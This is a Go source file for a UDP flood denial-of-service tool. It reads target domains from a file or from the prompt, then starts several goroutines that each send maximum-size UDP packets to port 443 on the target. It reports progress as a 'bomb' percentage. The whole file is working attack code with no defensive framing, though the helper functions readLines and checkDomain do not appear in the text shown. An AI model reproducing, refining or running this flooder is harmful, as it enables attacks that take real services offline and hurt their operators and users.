package main

import (
	"bufio"
	"fmt"
	"net"
	"os"
	"strconv"
	"strings"
)

func handleTarget(packet bool) (addr string, iter int, threads int) {
	reader := bufio.NewReader(os.Stdin)
	var ad string
	if !packet {
		fmt.Print("Domain: ")
		address, _ := reader.ReadString('\n')
		ad = strings.TrimSpace(address)
	}
	fmt.Print("iterations (*100000): ")
	it, _ := reader.ReadString('\n')
	itt, _ := strconv.Atoi(strings.TrimSpace(it))
	fmt.Print("threads: ")
	th, _ := reader.ReadString('\n')
	t, _ := strconv.Atoi(strings.TrimSpace(th))
	return ad, itt * 100000, t
}

func exec(addr string, iter int, c chan int8) {
	fullAddr := fmt.Sprintf("%s:%v", addr, 443)
	buf := make([]byte, 65507)
	conn, _ := net.Dial("udp", fullAddr)
	for i := 0; i < iter; i++ {
		_, _ = conn.Write(buf)
		c <- 0
	}
	c <- 1
}

func bomb(addr string, iter int, threads int) {
	var lastP float64 = 0
	c := make(chan int8)
	done := 0
	curr := 0
	for i := 0; i < threads; i++ {
		go exec(addr, iter/threads, c)
	}
	for {
		select {
		case m := <-c:
			if m == 0 {
				curr++
			} else {
				done++
			}
			if done == threads {
				fmt.Printf("\rBomb %s (iterations %d) was finished\n", addr, iter)
				return
			}
			p := (float64(curr) / float64(iter)) * 100
			if p-lastP > 1 {
				fmt.Printf("\rAddr %s done on %.2f percent", addr, p)
				lastP = p
			}
		}
	}
}

func main() {
	ss, err := readLines("targets.txt")
	count := len(ss)
	if count == 0 || err != nil { // interactive mode
		for {
			addr, iter, t := handleTarget(false)
			err := checkDomain(addr)
			if err == nil && iter > 0 && t > 0 {
				fmt.Printf("Bomb %s (iterations %d) was started..\n", addr, iter)
				bomb(addr, iter, t)
			} else {
				fmt.Print("Invalid data\n")
			}
		}
	} else { // single mode
		fmt.Printf("Found %d targets to bomb \n", count)
		_, iter, t := handleTarget(true)
		for _, addr := range ss {
			fmt.Printf("Bomb %s (iterations %d) was started..\n", addr, iter)
			bomb(addr, iter, t)
		}
	}
}
